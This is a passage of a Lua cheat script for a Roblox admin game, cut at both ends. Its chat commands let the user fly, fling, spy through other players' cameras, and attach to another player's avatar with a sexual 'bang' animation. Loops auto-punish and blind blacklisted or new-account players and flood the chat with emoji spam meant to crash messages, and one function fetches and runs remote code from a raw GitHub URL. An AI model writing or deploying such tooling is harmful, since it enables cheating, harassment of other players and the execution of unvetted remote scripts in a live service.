				carpetLoop:Disconnect()
				carpet:Stop()
				carpetAnim:Destroy()
				carpetDied:Disconnect()
			end)

			carpetLoop = RunService.Heartbeat:Connect(function()
				pcall(function()
					getRoot(game.Players.LocalPlayer.Character).CFrame = getRoot(carpetplr.Character).CFrame
				end)
			end)

			Remind("You're a carpet for the player!")
		else
			Remind("This command requires the r6 rig type. Do r6.")
		end
	end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'uncarpet' then
		if carpetLoop then
			carpetLoop:Disconnect()
			carpetDied:Disconnect()
			carpet:Stop()
			carpetAnim:Destroy()
			Remind("You're no longer a carpet for the player!")
		end
     end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'bang' then
		local args = string.split(msg, " ")
                if #args == 3 then
                        bangsp = tonumber(args[3])
                end
		local dasplayer = args[2]
        	PLAYERCHECK(dasplayer)
        	if player == nil then 
			return Remind("Fail: User not found!")
		elseif player == "ScriptingProgrammer" or player == "atprog" or player == "kohlslitedev" then
			Remind("You can't bang developers!")
		else
			banger = cplr
		end

		Chat(prefix.."unbang")
		RunService = game:GetService("RunService")
		task.wait()

		local humanoid = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
		bangAnim = Instance.new("Animation")
		bangAnim.AnimationId = not checkforR15(game.Players.LocalPlayer) and "rbxassetid://148840371" or "rbxassetid://5918726674"
		bang = humanoid:LoadAnimation(bangAnim)
		bang:Play(0.1, 1, 1)
		if #args == 3 then 
			bang:AdjustSpeed(bangsp)
		else
			bang:AdjustSpeed(3)
		end

		bangDied = humanoid.Died:Connect(function()
			bang:Stop()
			bangAnim:Destroy()
			bangDied:Disconnect()
			bangLoop:Disconnect()
		end)

		local bangplr = banger
		local bangOffet = CFrame.new(0, 0, 1.1)

		bangLoop = RunService.Stepped:Connect(function()
			pcall(function()
				local otherRoot = getTorso(bangplr.Character)
				getRoot(game.Players.LocalPlayer.Character).CFrame = otherRoot.CFrame * bangOffet
			end)
		end)
		Remind("You're banging the player!")
	end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'unbang' then
	if bangDied then
		bangDied:Disconnect()
		bang:Stop()
		bangAnim:Destroy()
		bangLoop:Disconnect()
		Remind("You're no longer banging the player!")
	end
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'mutebb' then -- yes this isn't a loop, i'm lazy
	SoundService = game:GetService("SoundService")
	if not notifiedRespectFiltering and SoundService.RespectFilteringEnabled then 
			notifiedRespectFiltering = true 
	end
	local players = game.Players:GetPlayers()
	for i, v in pairs(players) do
		task.spawn(function()
			for i, x in next, v.Character:GetDescendants() do
				if x:IsA("Sound") and x.Playing == true then
					x.Playing = false
				end
			end
			for i, x in next, v:FindFirstChildOfClass("Backpack"):GetDescendants() do
				if x:IsA("Sound") and x.Playing == true then
					x.Playing = false
				end
			end
		end)
	end
	Remind("Muted people's boomboxes!")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'unmutebb' then
	SoundService = game:GetService("SoundService")
	if not notifiedRespectFiltering and SoundService.RespectFilteringEnabled then 
			notifiedRespectFiltering = true 
	end

	local players = game.Players:GetPlayers()
	for i, v in pairs(players) do
		task.spawn(function()
			for i, x in next, v.Character:GetDescendants() do
					if x:IsA("Sound") and x.Playing == false then
						x.Playing = true
					end
			end
		end)
        end
	Remind("Unmuted people's boomboxes!")
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'view' then
		local dasplayer = string.sub(msg:lower(), #prefix + 6)
        	PLAYERCHECK(dasplayer)
        	if player == nil then 
			return Remind("Fail: User not found!")
		else
			brokeboi = cplr
		end

		StopFreecam()
		if viewDied then
			viewDied:Disconnect()
			viewChanged:Disconnect()
		end

		viewing = brokeboi
		workspace.CurrentCamera.CameraSubject = viewing.Character
		Remind("Viewing " .. brokeboi.Name)

		local function viewDiedFunc()
			repeat wait() until brokeboi.Character ~= nil and getRoot(brokeboi.Character)
			workspace.CurrentCamera.CameraSubject = viewing.Character
		end

		viewDied = brokeboi.CharacterAdded:Connect(viewDiedFunc)
		local function viewChangedFunc()
			workspace.CurrentCamera.CameraSubject = viewing.Character
		end

		viewChanged = workspace.CurrentCamera:GetPropertyChangedSignal("CameraSubject"):Connect(viewChangedFunc)
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'unview' then
	StopFreecam()
	if viewing ~= nil then
		viewing = nil
		Remind('No longer viewing the player.')
	end
	if viewDied then
		viewDied:Disconnect()
		viewChanged:Disconnect()
	end
	workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'spin' then
	local args = string.split(msg, " ")
        if #args == 2 then
                        spinSpeed = tonumber(args[2])
	else
			spinSpeed = 20
        end
	for i,v in pairs(getRoot(game.Players.LocalPlayer.Character):GetChildren()) do
		if v.Name == "Spinning" then
			v:Destroy()
		end
	end
	local Spin = Instance.new("BodyAngularVelocity")
	Spin.Name = "Spinning"
	Spin.Parent = getRoot(game.Players.LocalPlayer.Character)
	Spin.MaxTorque = Vector3.new(0, math.huge, 0)
	Spin.AngularVelocity = Vector3.new(0,spinSpeed,0)
	Remind("Spinning without admin! Cool, right?")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'unspin' then
	for i,v in pairs(getRoot(game.Players.LocalPlayer.Character):GetChildren()) do
		if v.Name == "Spinning" then
			v:Destroy()
		end
	end
	Remind("No longer spinning!")
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'swim' then
		swim()
		Remind("Enabled swimming!")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'unswim' then
		unswim()
		Remind("Disabled swimming!")
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'tswim' then
	if swimming then
		Chat(prefix..'unswim')
	else
		Chat(prefix..'swim')
	end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'fling' then
		fling()
		Remind("Enabled flinging!")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'unfling' then
		unfling()
		Remind("Disabled flinging!")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'freecam' then
		StartFreecam()
		Remind("Starting up the free cam.")
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unfreecam' then
		StopFreecam()
		Remind("Stopping the free cam.")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'fcspeed' then
		local args = string.split(msg, " ")
       		if #args == 2 then
                        FCspeed = args[2]
		else
			FCspeed = 1
       		end
		if isNumber(FCspeed) then
			NAV_KEYBOARD_SPEED = Vector3.new(FCspeed, FCspeed, FCspeed)
		end    
		Remind("Changed the free cam speed.")
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'stopanims' then
		local Char = game.Players.LocalPlayer.Character
		local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")
		for i,v in next, Hum:GetPlayingAnimationTracks() do
			v:Stop()
		end
		Remind("Stopped animations!")
    end

   if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'noanim' then
		game.Players.LocalPlayer.Character.Animate.Disabled = true
		Remind("Removed animations!")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'reanim' then
		game.Players.LocalPlayer.Character.Animate.Disabled = false
		Remind("Added animations!")
    end

    if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'sit' then
		game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").Sit = true
		Remind("You are now sitting! To stop sitting, jump... or do unsit.")
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'unsit' then
		game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").Sit = false
		Remind("Were you too lazy to jump, or were you so stupid you didn't know how to so you had to use this command?")
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'trip' then
	if game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") and getRoot(game.Players.LocalPlayer.Character) then
		local hum = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
		local root = getRoot(game.Players.LocalPlayer.Character)
		hum:ChangeState(0)
		root.Velocity = root.CFrame.LookVector * 30
		Remind("You've been tripped without admin! Cool, right?")
	end
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'animsp' then
		local args = string.split(msg, " ")
                if #args == 2 then
                        anisp = tonumber(args[2])
                end
		local Char = game.Players.LocalPlayer.Character
		local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")
		for i,v in next, Hum:GetPlayingAnimationTracks() do
			if #args == 2 then
				v:AdjustSpeed(anisp)
			else
				v:AdjustSpeed(1)
			end
		end
		Remind("Modified animation speed!")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'delvelo' then
		for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
			if v:IsA("BodyVelocity") or v:IsA("BodyGyro") or v:IsA("RocketPropulsion") or v:IsA("BodyThrust") or v:IsA("BodyAngularVelocity") or v:IsA("AngularVelocity") or v:IsA("BodyForce") or v:IsA("VectorForce") or v:IsA("LineForce") then
				v:Destroy()
			end
		end
		Remind("Deleted velocities in your character.")
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'bvelo' then
		local bas = false
		V3 = Vector3.new(0, 0, 0)
		delay(1, function()
			bas = true
		end)
		while not bas do
			for _, v in ipairs(game.Players.LocalPlayer.Character:GetDescendants()) do
				if v:IsA("BasePart") then
					v.Velocity = V3
					v.RotVelocity = V3
				end
			end
			wait()
		end
		Remind("Set velocity in your character to 0.")
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'cfly' then
	Remind("Setting you up...")
	game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
	local Head = game.Players.LocalPlayer.Character:WaitForChild("Head")
	Head.Anchored = true
	if CFloop then CFloop:Disconnect() end
	RunService = game:GetService("RunService")
	CFloop = RunService.Heartbeat:Connect(function(deltaTime)
		local moveDirection = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').MoveDirection * (CFspeed * deltaTime)
		local headCFrame = Head.CFrame
		local cameraCFrame = workspace.CurrentCamera.CFrame
		local cameraOffset = headCFrame:ToObjectSpace(cameraCFrame).Position
		cameraCFrame = cameraCFrame * CFrame.new(-cameraOffset.X, -cameraOffset.Y, -cameraOffset.Z + 1)
		local cameraPosition = cameraCFrame.Position
		local headPosition = headCFrame.Position

		local objectSpaceVelocity = CFrame.new(cameraPosition, Vector3.new(headPosition.X, cameraPosition.Y, headPosition.Z)):VectorToObjectSpace(moveDirection)
		Head.CFrame = CFrame.new(headPosition) * (cameraCFrame - cameraPosition) * CFrame.new(objectSpaceVelocity)
	end)
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'uncfly' then
	if CFloop then
		CFloop:Disconnect()
		game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
		local Head = game.Players.LocalPlayer.Character:WaitForChild("Head")
		Head.Anchored = false
	end
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'cfspeed' then
        local args = string.split(msg, " ")
	if isNumber(args[2]) then
		CFspeed = args[2]
	end
    end

    if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'fly' then
        local args = string.split(msg, " ")
	if not IsOnMobile then
		NOFLY()
		wait()
		sFLY()
	else
		mobilefly(game.Players.LocalPlayer)
	end
	if args[2] and isNumber(args[2]) then
		flyspeed = args[2]
	end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'unfly' then
	if not IsOnMobile then 
		NOFLY() 
	else 
		unmobilefly(game.Players.LocalPlayer)
	end
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'fspeed' then
	local args = string.split(msg, " ")
	local speed = args[2] or 1
	if isNumber(speed) then
		flyspeed = speed
	end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'qefly' then
	local args = string.split(msg, " ")
	if args[2] == 'false' then
		QEfly = false
	else
		QEfly = true
	end
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'tfly' then
	if FLYING then
		if not IsOnMobile then 
			NOFLY()
		else 
			unmobilefly(game.Players.LocalPlayer) 
		end
	else
		if not IsOnMobile then 
			sFLY() 
		else 
			mobilefly(game.Players.LocalPlayer) 
		end
	end
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'weaken' then
	local args = string.split(msg, " ")
	for _, child in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
		if child.ClassName == "Part" then
			if args[2] then
				child.CustomPhysicalProperties = PhysicalProperties.new(-args[1], 0.3, 0.5)
			else
				child.CustomPhysicalProperties = PhysicalProperties.new(0, 0.3, 0.5)
			end
		end
	end
    end
		
    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'unweaken' then
	local args = string.split(msg, " ")
	for _, child in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
		if child.ClassName == "Part" then
			child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
		end
	end
    end
		
    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'strengthen' then
	local args = string.split(msg, " ")
	for _, child in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
		if child.ClassName == "Part" then
			if args[2] then
				child.CustomPhysicalProperties = PhysicalProperties.new(args[1], 0.3, 0.5)
			else
				child.CustomPhysicalProperties = PhysicalProperties.new(100, 0.3, 0.5)
			end
		end
	end
    end
			
    if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'unstrengthen' then
	local args = string.split(msg, " ")
	for _, child in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
		if child.ClassName == "Part" then
			child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
		end
	end
    end

end)

-- PLAYER CHECK
function PLAYERCHECK(plr)
  for i, v in pairs(game.Players:GetPlayers()) do
      if string.sub(v.Name:lower(), 1, #plr) == plr:lower() then
          player = v.Name
          cplr = v
          Remind("[KL User Search]: Found "..player) -- i have no idea how i never capitalised this
      end
  end
end

-- Only uses for blacklisting, there is NO way I am coding it for everything
function bypassattemptcheck(plr)
                if string.sub(string.lower(plr), 1,3) == "me_" then
                        return true, "m"
                elseif string.sub(string.lower(plr), 1,4) == "all_" then
                        return true, "al"
                elseif string.sub(string.lower(plr), 1,7) == "others_" then
                        return true, "other"        
                elseif string.sub(string.lower(plr), 1,8) == "friends_" then
                        return true, "frien"
                elseif string.sub(string.lower(plr), 1,7) == "admins_" then
                        return true, "admi"
                elseif string.sub(string.lower(plr), 1,10) == "nonadmins_" then
                        return true, "nonadmi"
                elseif string.sub(string.lower(plr), 1,7) == "random_" then
                        return true, "rando"
                end
end

function CMDPrint()
	GExecute("https://raw.githubusercontent.com/S-PScripts/scripts/refs/heads/main/Luau/KAH/Main%20Scripts/cmd-list.lua")
end

-- CHECK FOR PERM
function checkforperm()
        if string.match(game:HttpGet("https://inventory.roproxy.com/v1/users/" .. gcplr.UserId .. "/items/GamePass/" .. 66254), 66254) then
            Remind(gcplrn.." has perm in NBC!")
            Chat("h \n\n\n\n \n\n\n\n " .. gcplrn .. " has perm in NBC! \n\n\n\n")
          --  Speak(gcplrn.." has perm in NBC!")
            if not table.find(permusers, gcplrn) then
                    table.insert(permusers, gcplrn)
            end
        elseif string.match(game:HttpGet("https://inventory.roproxy.com/v1/users/" .. gcplr.UserId .. "/items/GamePass/" .. 64354), 64354) then
            Remind(gcplrn.." has perm in BC!")
	    Chat("h \n\n\n\n \n\n\n\n " .. gcplrn .. " has perm in BC! \n\n\n\n")
           -- Speak(gcplrn.." has perm in BC!")
            table.insert(permusers, gcplrn)
            if not table.find(permusers, gcplrn) then
                    table.insert(permusers, gcplrn)
            end
        else 
                Remind(gcplrn..' does not have perm!')
	        Chat("h \n\n\n\n \n\n\n\n " .. gcplrn .. " does not perm! \n\n\n\n")
            --    Speak(gcplrn..' does not have perm!')
        end
end

-- CHECK FOR PERSONS
function checkforpersons()
        if string.match(game:HttpGet("https://inventory.roproxy.com/v1/users/" .. gcplr.UserId .. "/items/GamePass/" .. 35748), 35748) then
            Remind(gcplrn.." has persons in NBC!")
	    Chat("h \n\n\n\n \n\n\n\n \n\n\n\n " .. gcplrn .. " has persons in NBC! \n\n\n\n")
           -- Speak(gcplrn.." has persons in NBC!")
            table.insert(personsusers, gcplrn)
            if not table.find(personsusers, gcplrn) then
                    table.insert(personsusers, gcplrn)
            end
        elseif string.match(game:HttpGet("https://inventory.roproxy.com/v1/users/" .. gcplr.UserId .. "/items/GamePass/" .. 37127), 37127) then
            Remind(gcplrn.." has persons in BC!")
	    Chat("h \n\n\n\n \n\n\n\n \n\n\n\n " .. gcplrn .. " has persons in BC! \n\n\n\n")
           -- Speak(gcplrn.." has persons in BC!")
            table.insert(personsusers, gcplrn)
            if not table.find(personsusers, gcplrn) then
                    table.insert(personsusers, gcplrn)
            end
        else 
                Remind(gcplrn..' does not have persons!')
		Chat("h \n\n\n\n \n\n\n\n \n\n\n\n " .. gcplrn .. " does not persons! \n\n\n\n")
             --   Speak(gcplrn..' does not have persons!')
        end
end

-- Serverlock, blacklist, whitelist (not that good but decent still)
task.spawn(function()
    while true do
    task.wait(0)
    local players = game.Players:GetPlayers()
    for i, v in pairs(game.Workspace:GetChildren()) do
        if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(whitelist, v.Name) and not table.find(pwl, v.Name)) then
            for i, player in ipairs(players) do
                if string.find(player.Name:lower(), v.Name:lower()) then
                    if slockenabled == true then
                        if not game.Lighting:FindFirstChild(v.Name) then
                                local isB,spe = bypassattemptcheck(v.Name)
                                if isB then
                                        Chat('punish '.. spe)
                                        Chat('blind '.. spe)
					Chat('skydive '.. spe)
                                        Chat("pm "..spe.." Sorry, this server is locked!")
                                else
                                         Chat('punish '..v.Name)
                                         Chat('blind '..v.Name)   
                                         Chat('skydive '..v.Name)        
                                         Chat("pm "..v.Name.." Sorry, this server is locked!")
                                end
                        end
                    elseif table.find(blacklist, v.Name) then
                        if not game.Lighting:FindFirstChild(v.Name) then
                                local isB,spe = bypassattemptcheck(v.Name)
                                if isB then -- i added because of some guy called m_artin who did crap
                                        Chat('punish '.. spe)
                                        Chat('blind '.. spe)
					Chat('skydive '.. spe)
                                        Chat("pm "..spe.." Sorry, you are blacklisted from this server!")
                                else
                                         Chat('punish '..v.Name)
                                         Chat('blind '..v.Name)   
                                         Chat('skydive '..v.Name)        
                                         Chat("pm "..v.Name.." Sorry, you are blacklisted from this server!")
                                end
                        end
                    elseif table.find(newplrslocked, v.Name) and newplrautoslock == true then
                        if not game.Lighting:FindFirstChild(v.Name) then
                                local isB,spe = bypassattemptcheck(v.Name)
                                if isB then
                                        Chat('punish '.. spe)
                                        Chat('blind '.. spe)
	                                Chat('skydive '..spe)        
                                        Chat("pm "..spe.." Sorry, you are blacklisted for having an account under the account age limit!")
                                else
                                        Chat('punish '..v.Name)
                                        Chat('blind '..v.Name)
	                                Chat('skydive '..v.Name)
                                        Chat("pm "..v.Name.." Sorry, you are blacklisted for having an account under the account age limit!")
                                end
                        end
                    else
                    end
                    break
                end
            end
        end
    end
    end
end)

-- visual
task.spawn(function()
    while true do
        task.wait()
        for i,v in pairs(game:GetService("Workspace").Terrain["_Game"].Folder:GetChildren()) do
            if v:IsA('Script') then
                  if antidisco == true then    
                          if v.Name == "Disco" then
                              v:Destroy() -- :)
                              Chat("fix")
                          end
                  end
                  if antiflash == true then    
                          if v.Name == "Flash" then
                              v:Destroy() -- :)
                              Chat("fix")
                          end
                  end
            end
        end

        if antifogend == true then
           if game.Lighting.FogEnd ~= 100000 then
              Chat("fogend 100000")
           end
        end

        if antiilight == true then
                 if game.Workspace:FindFirstChild("StarShard") then
                          game.Workspace.StarShard:Destroy()
                end
                if game.Workspace:FindFirstChild("Part") then
                          if game.Workspace.Part:FindFirstChild("Twinkle") then
                                   game.Workspace.Part:Destroy()
                           end
                 end
        end

        if gjdelock == true then
           if game.Lighting.FogEnd ~= 500 then
              Chat("fogend 500")
              Chat("fogcolor 0 0 0") -- i don't know what 0 0 0 is as color3 so it's added to this category
           end
        end

        if antifogcolor == true then
                if game.Lighting.FogColor ~= Color3.new(0.75294125080109,0.75294125080109,0.75294125080109) then
                        Chat("fogcolor 192 192 192")        
                end
        end

        if antifogstart == true then
           if game.Lighting.FogStart ~= 0 then
                Chat("fogstart 0")           
           end
        end

        if antitime == true then
                if game.Lighting.ClockTime ~= 14 then
                        Chat("time 14")
                end
        end

        if gjdelock == true then
                if game.Lighting.ClockTime ~= 6 then
                        Chat("time 6")
                end
        end

        if antitripmine == true then
           if workspace:FindFirstChild("SubspaceTripmine") then
              workspace:FindFirstChild("SubspaceTripmine"):Destroy()
              Chat("clr")
           end
        end

        if antiegg == true then
           if workspace:FindFirstChild("EggBomb") then
              workspace:FindFirstChild("EggBomb"):Destroy()
              Chat("clr")
           end
        end

        if antiplant == true then
           if workspace:FindFirstChild("BitePlant") then
              workspace:FindFirstChild("BitePlant"):Destroy()
              Chat("clr")
           end
        end

        if antiambient == true then
                if game.Lighting.Ambient ~= Color3.new(0,0,0) then
                        Chat("ambient 0 0 0")
                end
        end

        if antibrightness == true then
                if game.Lighting.Brightness ~= 1 then
                        Chat("brightness 1")                
                end        
        end

        if antioutamb == true then
                if game.Lighting.OutdoorAmbient ~= Color3.fromRGB(128,128,128) then
                        Chat("outdoorambient 128 128 128")                
                end        
        end

  end
end)

-- anti chat/msg-crash
task.spawn(function()
        while true do
        task.wait(0.1)
                if antichat == true then
                        --if haspersons == true then
                        --        Chat("m/ 😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭")
                        --else
                                Chat("m 😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭")
                        --end
                end
                if antichatplr == true then
                        -- if haspersons == true then
                                  -- Chat("pm/"..acplr.." 😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭")
                        -- else
                                Chat("pm "..acplr.." 😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭💀💀💀💀💀💀💀💀💀😀😃😄😁😆😅😂🤣😭")
                        -- end
                end
        end
end)

antis = {
    antiblind = false,
    antivoid = false,
    antiskydive = false,
    antigrayscale = false,
    antiaddon = false,
    anticlone = false,
    antidog = false,
    antifire = false,
    antifreeze = false,
    antifly = false,
    antinoclip = false,
    antiff = false,
    antiglow = false,
    antihealthchange = false,
    antijail = false,
    antikill = false,
    antimessage = false,
    antiname = false,
    antichar = false,
    antiparticles = false,
    antipunish = false,
    antirocket = false,
    antisit = false,
    antiseizure = false,
    antismoke = false,
    antisparkles = false,
    antispeed = false,
    antispin = false,
    antistun = false,
    antisetgrav = false,
    antiswag = false,
    antimesh = true,
    antifling = false
}

autos = {
	autoff = false,
	autogod = false,
	tempautoff = false,
	tempautogod = false
}

local connections = {}
local lp = game.Players.LocalPlayer

connections[#connections + 1] =
    game:GetService("RunService").RenderStepped:Connect(function()
	task.wait()
	
  	if autos.autoff == true or autos.tempautoff == true then
            if not lp.Character:FindFirstChild("ForceField") then
                Chat("ff me")
                task.wait(0.1)
            end
        end

        if autos.autogod == true or autos.tempautogod == true then
            if tostring(lp.Character.Humanoid.MaxHealth) ~= "inf" then
                    Chat("god me")
                    lp.Character.Humanoid.MaxHealth = math.huge
                    lp.Character.Humanoid.Health = 9e9            
            end
        end

	if autocharme == true then 
                if autocharid ~= game.Players.LocalPlayer.CharacterAppearanceId then
                                                      Chat('char me '..autocharid)
                else end
        end

        if antis.antiblind == true then
            for i, v in pairs(lp.PlayerGui:GetDescendants()) do
                if v.Name == "EFFECTGUIBLIND" then
                    v:Destroy()
                end
            end
        end

        if antis.antivoid == true then
            if lp.Character --[[ and lp.Character.HumanoidRootPart]] then
                if lp.Character.HumanoidRootPart.Position.Y < -7 then
                    lp.Character.HumanoidRootPart.CFrame = 
					CFrame.new(lp.Character.HumanoidRootPart.Position.X,5,lp.Character.HumanoidRootPart.Position.Z)
                    lp.Character.HumanoidRootPart.Velocity = 
					Vector3.new(lp.Character.HumanoidRootPart.Velocity.X,0,lp.Character.HumanoidRootPart.Velocity.Z)
                end
            end
        end

        if antis.antiskydive == true then
            if lp.Character --[[ and lp.Character.HumanoidRootPart]] then
                if lp.Character.HumanoidRootPart.Position.Y > 256 then
                    lp.Character.HumanoidRootPart.CFrame =
                        CFrame.new(lp.Character.HumanoidRootPart.Position.X,5,lp.Character.HumanoidRootPart.Position.Z)
                    lp.Character.HumanoidRootPart.Velocity =
                        Vector3.new(lp.Character.HumanoidRootPart.Velocity.X,0,lp.Character.HumanoidRootPart.Velocity.Z)
                end
            end
        end

        if antis.antigrayscale == true then
            if game.Workspace.CurrentCamera:FindFirstChild("GrayScale") then
                game.Workspace.CurrentCamera:FindFirstChild("GrayScale"):Destroy()
            end
        end

        if antis.antiaddon == true then
            if lp.Character:FindFirstChild("Addon") then
                lp.Character:FindFirstChild("Addon"):Destroy()
                Chat("reset me")
            end
        end

        if antis.anticlone == true then
            if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild(lp.Name) then
                Chat("unclone me")
            end
        end

        if antis.antidog == true then
            for i, v in pairs(lp.Character:GetDescendants()) do
                if v:IsA("Seat") then
                    Chat("undog me")
                end
            end
        end

        if antis.antifire == true then
            if lp.Character:FindFirstChild("Torso") then
                if lp.Character.Torso:FindFirstChild("Fire") then
                    lp.Character.Torso:FindFirstChild("Fire"):Destroy()
                    Chat("unfire me")
                end
            end
        end

        if antis.antifreeze == true then
            if lp.Character:FindFirstChild("ice") then
                Chat("thaw me")
            end
        end

        if antis.antifly == true then
            if not lp.Character:FindFirstChild("Seizure") and lp.Character.Humanoid:GetState().Name == "PlatformStanding" then
                Chat("unfly me")
                Chat("clip me")
                if lp.Character and lp.Character.Torso then
                    lp.Character.Torso.Anchored = false
                end
                if lp.Character and lp.Character.Humanoid then
                    lp.Character.Humanoid.PlatformStand = false
                end
            end
        end

        if antis.antinoclip == true then
            if lp.PlayerGui:FindFirstChild("NoClip") then
                lp.PlayerGui:FindFirstChild("NoClip"):Destroy()
                if lp.Character and lp.Character.Torso then
                    lp.Character.Torso.Anchored = false
                end
                if lp.Character and lp.Character.Humanoid then
                    lp.Character.Humanoid.PlatformStand = false
                end
                Chat("clip me")
            end
        end

        if antis.antiff == true then
            if lp.Character:FindFirstChild("ForceField") then
                lp.Character:FindFirstChild("ForceField"):Destroy()
                Chat("unff me")
            end
        end

        if antis.antiff == true then
            local torso = lp.Character:WaitForChild("Torso", 1)
            for i, v in pairs(torso:GetChildren()) do
                if v:IsA("PointLight") then
                    v:Destroy()
                    Chat("unglow me")
                end
            end
        end

        if antis.antihealthchange == true then
            if lp.Character.Humanoid and lp.Character.Humanoid.Health ~= 100 then
                Chat("health me 100")
            end
        end

        if antis.antijail == true then
            if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild(lp.Name .. "'s jail")
             then
                Chat("unjail me")
            end
        end

        if antis.antijump == true then
            if lp.Character.Humanoid and lp.Character.Humanoid.JumpPower ~= 50 then
                lp.Character.Humanoid.JumpPower = 50
            end
        end

	if editedjump == true then
            if lp.Character.Humanoid and lp.Character.Humanoid.JumpPower ~= editedjumpis then
                lp.Character.Humanoid.JumpPower = editedjumpis
            end
        end

        if antis.antikill == true then
            if lp.Character.Humanoid and lp.Character.Humanoid.Health == 0 then
                Chat("reset me")
            end
        end

        if antis.antimessage == true then
            for i, v in pairs(lp.PlayerGui:GetDescendants()) do
                if v.Name == "MessageGUI" or v.Name == "Message" or v.Name == "HintGUI" then -- or v.Name == "Ice" then
                    v:Destroy()
                end
            end
            for i, v in pairs(game.Workspace.Terrain["_Game"].Folder:GetDescendants()) do
                if v.Name == "Message" then
                    v:Destroy()
                end
            end
        end

        if antis.antiname == true then
            if lp and lp.Character:FindFirstChildOfClass("Model") then
                Chat("unname me")
            end
        end

        if antis.antichar == true then
            if lp.UserId ~= lp.CharacterAppearanceId then
                Chat("unchar me")
            end
        end

        if antis.antiparticles == true then
            local torso = lp.Character:WaitForChild("Torso", 1)
            for i, v in pairs(torso:GetChildren()) do
                if v:IsA("ParticleEmitter") then
                    v:Destroy()
                    Chat("unparticle me")
                end
            end
        end

        if antis.antipunish == true then
            if game.Lighting:FindFirstChild(lp.Name) then
                Chat("unpunish me")
            end
        end

        if antis.antirocket == true then
            for i, v in pairs(lp.Character:GetChildren()) do
                if v.Name == "Rocket" then
                    lp.Character.Rocket.CanCollide = false
                    task.wait(0.5)
                    v:Destroy()
                end
            end
        end

        if antis.antisit == true then
            local player = lp
